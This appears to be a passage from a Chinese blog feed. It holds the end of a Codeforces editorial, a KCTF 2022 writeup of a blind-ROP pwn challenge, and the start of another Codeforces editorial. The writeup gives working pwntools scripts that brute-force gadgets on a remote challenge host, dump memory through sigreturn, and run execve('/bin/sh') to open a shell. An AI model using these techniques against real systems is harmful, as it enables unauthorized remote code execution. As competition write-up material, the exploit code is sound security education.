class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    target=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">        target*=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="built_in">bfs</span>(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    <span class="comment">//cin&gt;&gt;t;</span></span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="In-The-End"><a href="#In-The-End" class="headerlink" title="In The End"></a>In The End</h2><p>这波应该是手速场，手速快就是上大分，继上一次罚时爆炸之后这场没有一点罚时，挺好的，刚刚掉蓝一下给加回来了。</p><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/5.png" alt="5"></p><p><img src="/2022/05/24/Educational%20Codeforces%20Round%20129(Div.2)/6.png" alt="6"></p><p>100分！</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>KCTF2022春季赛 第六题 writeup</title>
      <link href="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/"/>
      <url>/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/</url>
      
        <content type="html"><![CDATA[<p>KCTF2022春季赛 第六题 writeup</p><span id="more"></span><p>这题，BROP提示给的很明显，所以就是盲打，不管怎么说先问(bao)候(da)一下出题人。</p><p>首先我们一开始什么都不知道，就先确定一下一些基本信息，那么就先测试一下缓冲区的长度，最后发现缓冲区长度为0x10。</p><p>我们先执行一遍正常流程，大概就是：</p><ol><li>输出一句话</li><li>输入</li><li>输出一句话</li></ol><p>当存在栈溢出的时候，最后一句话输出不出来，因此可以断定，溢出是发生在自己定义的函数的。大概写一下伪代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">void func()&#123;</span><br><span class="line">char buf[16];</span><br><span class="line">gets(buf);</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">puts(&quot;hacker, TNT!&quot;);</span><br><span class="line">func();</span><br><span class="line">puts(&quot;TNT TNT!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，输出第一句话的语句可能也在 <code>func</code> 里面，但是不影响，我们先爆破第一个字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p8(i)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/1.png" alt="1"></p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/2.png" alt="2"></p><p>可以发现，当覆盖一个 <code>\xb0</code> 字节的时候，程序重新执行了一遍 <code>main</code> 函数，当覆盖一个 <code>\xce</code> 字节的时候，程序执行正常流程退出了，那么我们可以得出以下信息：</p><ul><li><code>main</code> 函数的低位为 <code>0xb0</code></li><li><code>func</code> 函数的返回地址为 <code>0xce</code></li></ul><p>这里其实可以确定输出第一句话的函数在 <code>main</code> 当中了，因为如果在 <code>func</code> 函数当中，那么一定会存在两个地址使得程序重新执行一遍流程，那就是改成了 <code>func</code> 函数和 <code>main</code> 函数的地址都会这样，没有就说明第一句话输出不在 <code>main</code> 当中。</p><p>然后再勇敢地一试，猜测它的地址为 <code>0x4000b0</code>，结果发现也是重新执行了 <code>main</code> 函数，这也间接断定了这个程序是 <code>64</code> 位的。上面推出的两个地址也确定了。</p><p>接下来，就可以尝试取寻找 <code>gadget</code> 了，我们要寻找的首要 <code>gadget</code> 自然就是 <code>pop rdi ret</code> 了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b0</span></span><br><span class="line">ret=<span class="number">0x4000ce</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x401900</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        s=p.recvline()</span><br><span class="line">        payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(ret)+p64(main)</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        p.send(payload)</span><br><span class="line">        ss=(p.recvline(timeout=<span class="number">1</span>))</span><br><span class="line">        <span class="built_in">print</span>(ss)</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>在这个 <code>payload</code> 当中，可以发现，如果寻找的 <code>gadget</code> 为 <code>ret</code>，那么则会继续流程，如果 <code>gadget</code> 类似于 <code>pop xxx ret</code> 的话则会重新执行 <code>main</code> 函数。结果 <code>ret</code> 找到了很多，其它的 <code>gadget</code> 愣是没找到一个，于是决定往后面再加一个 <code>p64(main)</code>，结果居然找到了七个地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a0x4000f5 pop xxx *2;ret</span><br><span class="line">0x4000fa pop xxx *2;ret</span><br><span class="line">0x4000fb pop xxx *2;ret</span><br><span class="line">0x4000fd pop xxx *2;ret</span><br><span class="line">0x4000fe pop xxx *2;ret</span><br><span class="line">0x400100 pop xxx *2;ret</span><br><span class="line">0x400101 ret</span><br><span class="line">0x400102 pop xxx *2 ; ret</span><br><span class="line">0x400106 ret</span><br></pre></td></tr></table></figure><p>然后我尝试取寻找它的 <code>IO</code> 函数去输出它的 <code>got</code> 表，但是测了很多地址都没有发现有输出 <code>\n</code> 字节，这里也排除它用 <code>puts</code> 函数输出的可能，但是它可能也用了 <code>printf</code> 或者是 <code>write</code> 函数之类的，但是我还是往 <code>printf</code> 去想而没有往 <code>write</code> 去想。然后我就拿那些 <code>gadget</code> 试着传参看看，结果不出意外都失败了，无任何回显。</p><p>这里我困扰了很久，后来我们队的 <code>ThTsOd</code> 师傅给了我一个很重要的思路，那就是</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/3.png" alt="3"></p><p>再来看看精致得分的规则：</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/4.png" alt="4"></p><p>直接拉满了那就很能说明问题了，肯定是甚至没有 <code>plt</code> 或者 <code>got</code> 表的那种文件，直接用的 <code>syscall</code> 才能有这么小的长度。</p><p>这里借用以下 <code>ThTsOd</code> 师傅的脚本，帮我们确定了一些 <code>syscall</code> 的位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;warn&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x400000</span>,<span class="number">0x400120</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10005</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(i)+p64(pop_rdi)*<span class="number">3</span>+p64(<span class="number">1</span>)+p64(pop_rsi_2)+p64(<span class="number">0x400000</span>)*<span class="number">2</span>+p64(<span class="number">0x4000ce</span>)</span><br><span class="line">            <span class="comment">#payload=b&#x27;a&#x27;*0x10+</span></span><br><span class="line">            <span class="comment">#print(payload)</span></span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>)</span><br><span class="line">            ss=(p.recvall(timeout=<span class="number">1</span>))</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">hex</span>(i),k,ss)</span><br><span class="line">            <span class="comment">#if ss==s:</span></span><br><span class="line">            <span class="comment">#    break</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在这个脚本中，我们通过修改 <code>rax</code> 的值成功调用<code>sys_read</code> <code>dump</code> 出了栈上面的内存。</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/5.png" alt="5"></p><p>由此我们确定了 <code>syscall ret</code> 的 <code>gadget</code> 在 <code>0x4000ec</code> 的地方。但是还需要有一个固定能 <code>read</code> 的 <code>gadget</code> 才行，因为只有这样我们才能控制 <code>rax</code> 寄存器的值，来选择我们需要的系统调用。</p><p>当然我们也找到了，在<code>0x4000f3</code>，并且发现需要传两个参数才能把 <code>rop</code> 链拼接上去，感觉这里两个参数应该是 <code>add rsp,0x10</code> 产生的。</p><p>那也不用管那么多了，通过这两个 <code>gadget</code> 我们就能进行一次指定的系统调用，这里我们不选择使用 <code>write</code> 调用泄露栈的内存，我们直接把 <code>elf</code> 的内存给 <code>dump</code> 出来就行，因为没有 <code>gadget</code> 那我们直接用 <code>sigreturn</code> 的方式控制寄存器。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">pop_rdi = <span class="number">0x400101</span> - <span class="number">1</span></span><br><span class="line">pop_rsi_2 = <span class="number">0x400101</span> - <span class="number">3</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x4000b0 0 b&#x27;hacker, TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000ce 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INPUT</span></span><br><span class="line"><span class="string">0x4000b5 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b6 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000b8 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c2 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c7 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string">0x4000c9 0 b&#x27;TNT TNT!\n&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4000f3</span>,<span class="number">0x4000f4</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10088</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            s=p.recv()</span><br><span class="line">            rop=SigreturnFrame()</span><br><span class="line">            rop.rax=<span class="number">1</span></span><br><span class="line">            rop.rdi=<span class="number">1</span></span><br><span class="line">            rop.rip=syscall            </span><br><span class="line">            rop.rsp=<span class="number">0x400000</span></span><br><span class="line">            rop.rbp=<span class="number">0x400000</span></span><br><span class="line">            rop.rsi=<span class="number">0x400000</span></span><br><span class="line">            rop.rdx=<span class="number">0x400</span></span><br><span class="line">            </span><br><span class="line">            payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">            p.send(payload)</span><br><span class="line">            p.send(<span class="string">&#x27;B&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">            p.interactive()        </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="comment">#sleep(2)</span></span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">41 5c 41 5d 41 5e 41 5f c3</span></span><br><span class="line"><span class="string">rdi 1</span></span><br><span class="line"><span class="string">rsi str</span></span><br><span class="line"><span class="string">rdx len</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">101 RET</span></span><br><span class="line"><span class="string">102 POP</span></span><br><span class="line"><span class="string">106 RET</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p> <img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/6.png" alt="6"></p><p>可以看到我们就成功用 <code>sigreturn</code> 调用了 <code>sys_write(1,0x400000,0x400)</code> ，至此终于不是瞎子视角了，这里再是 <code>ThTsOd</code> 师傅帮我重建了 <code>ELF</code> 文件，<code>IDA</code> 一开</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/7.png" alt="7"></p><p>其实现在 <code>IDA</code> 已经不重要了，主要还是能本地调试就非常爽。</p><p>但是这里又卡了一个关，那就是找不到确定地址可写的地方写上 <code>/bin/sh</code>。这里又双叒叕是 <code>ThTsOd</code> 师傅向我指明了 <code>0x600000</code> 处的内存是可读可写的。</p><p><img src="/2022/05/23/KCTF2022%E6%98%A5%E5%AD%A3%E8%B5%9B_6/8.png" alt="8"></p><p>打开一看果然是这样，而且给的内存还挺多，那就爽了，直接先调用 <code>sys_read</code> 再上面写上 <code>/bin/sh</code> 顺便接上 <code>rop</code> 链，然后再一次 <code>sigreturn</code> 执行 <code>execve(&#39;/bin/sh&#39;,0,0)</code>  去获得 <code>shell</code>。</p><p>最终 <code>exp</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">main=<span class="number">0x4000b5</span></span><br><span class="line">ret=<span class="number">0x400101</span></span><br><span class="line">syscall=<span class="number">0x4000ec</span></span><br><span class="line">sysread=<span class="number">0x4000f3</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(host=<span class="string">&#x27;221.228.109.254&#x27;</span>,port=<span class="number">10100</span>)</span><br><span class="line">s=p.recv()</span><br><span class="line">rop=SigreturnFrame()</span><br><span class="line">rop.rax=<span class="number">0</span></span><br><span class="line">rop.rdi=<span class="number">0</span></span><br><span class="line">rop.rip=syscall            </span><br><span class="line">rop.rsp=<span class="number">0x600020</span></span><br><span class="line">rop.rbp=<span class="number">0x600020</span></span><br><span class="line">rop.rsi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0x400</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(syscall)+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop))</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line">rop.rax=<span class="number">59</span></span><br><span class="line">rop.rip=syscall</span><br><span class="line">rop.rdi=<span class="number">0x600000</span></span><br><span class="line">rop.rdx=<span class="number">0</span></span><br><span class="line">rop.rsi=<span class="number">0</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;/bin/sh\0&#x27;</span>+p64(sysread)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)+<span class="built_in">eval</span>(<span class="built_in">str</span>(rop)))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这题后面不难，主要是想办法 <code>dump</code> 内存重建 <code>elf</code>，然后就是签到的做法了。</p><p>题外话：那我不禁对那个精致分仅有 <code>87</code> 分的 <code>pwn</code> 题瑟瑟发抖了。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> pwn </category>
          
          <category> brop </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Codeforces Round 788(Div.2)题解</title>
      <link href="/2022/05/07/Codeforces%20Round%20788(Div.2)/"/>
      <url>/2022/05/07/Codeforces%20Round%20788(Div.2)/</url>
      
        <content type="html"><![CDATA[<p><a href="https://codeforces.com/contest/1670">Codeforces Round #788 (Div. 2)</a>题解。</p><p>实况在<a href="https://www.bilibili.com/video/BV1X3411P7jR?spm_id_from=333.999.0.0">这里</a></p><span id="more"></span><h2 id="A-Prof-Slim"><a href="#A-Prof-Slim" class="headerlink" title="A. Prof. Slim"></a>A. Prof. Slim</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/05/07/Codeforces%20Round%20788(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给你一个序列，一次操作会使序列中的两个数交换符号但不交换大小，问能否在若干次操作后使得序列不递减。容易得到负数的个数一定不变并且负数永远小于正数，因此最后的结果一定是负数全在前面，正数全在后面，因为一个位置的数的绝对值一定不会改变，所以可以得到在绝对值中，负数区域一定不递增，正数区域一定不递减。先 <code>O(n)</code> 统计所有的负数的个数，再判断就ok了。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 